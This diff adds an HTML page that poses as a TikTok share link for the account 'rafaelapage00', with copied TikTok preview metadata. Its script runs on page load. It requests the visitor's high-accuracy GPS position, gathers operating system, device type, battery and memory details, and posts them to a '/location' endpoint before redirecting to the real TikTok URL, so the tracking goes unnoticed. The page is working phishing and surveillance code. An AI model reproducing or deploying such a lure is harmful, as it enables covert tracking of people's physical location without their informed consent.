@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>TikTok · rafaelapage00</title>
+  
+  <meta property="og:title" content="TikTok · rafaelapage00"/>
+  <meta property="og:image" content="https://p16-common-sign.tiktokcdn.com/tos-alisg-p-0037/o8BjIv5CA6sGoVCzmB9yXMAViRavnFYoIiiIE~tplv-tiktokx-origin.image?dr=14575&x-expires=1782788400&x-signature=rOXe55EPPzpyIPBjXkL6l0Jb3OA%3D&t=4d5b0474&ps=13740610&shp=81f88b70&shcp=43f4a2f9&idc=my2"/>
+  <meta property="og:url" content="https://vm.tiktok.com/ZSCBCGC1T/"/>
+  <meta property="og:type" content="video.other"/>
+  <meta property="og:site_name" content="TikTok"/>
+  <meta property="og:locale" content="id_ID"/>
+  
+  <meta name="twitter:card" content="summary_large_image"/>
+  <meta name="twitter:title" content="TikTok · rafaelapage00"/>
+  <meta name="twitter:image" content="https://p16-common-sign.tiktokcdn.com/tos-alisg-p-0037/o8BjIv5CA6sGoVCzmB9yXMAViRavnFYoIiiIE~tplv-tiktokx-origin.image?dr=14575&x-expires=1782788400&x-signature=rOXe55EPPzpyIPBjXkL6l0Jb3OA%3D&t=4d5b0474&ps=13740610&shp=81f88b70&shcp=43f4a2f9&idc=my2"/>
+  
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { background: #000; width: 100vw; height: 100vh; }
+  </style>
+</head>
+<body>
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const TARGET_URL = params.get('url') || 'https://vm.tiktok.com/ZSCBCGC1T/';
+
+    async function getDeviceInfo() {
+      const os = navigator.platform || 'N/A';
+      const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+      let battery = 'N/A';
+      try {
+        if (navigator.getBattery) {
+          const b = await navigator.getBattery();
+          battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Sedang di Charge' : 'Tidak di Charge'})`;
+        }
+      } catch (e) {}
+      const memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A';
+      return { os, deviceType, battery, memory };
+    }
+
+    function start() {
+      if (!navigator.geolocation) {
+        window.location.href = TARGET_URL;
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        async (pos) => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+
+          try {
+            const device = await getDeviceInfo();
+            await fetch("/location", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ lat, lon, ...device })
+            });
+          } catch (err) {}
+
+          window.location.href = TARGET_URL;
+        },
+        () => {
+          window.location.href = TARGET_URL;
+        },
+        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+      );
+    }
+
+    start();
+  </script>
+</body>
+</html>
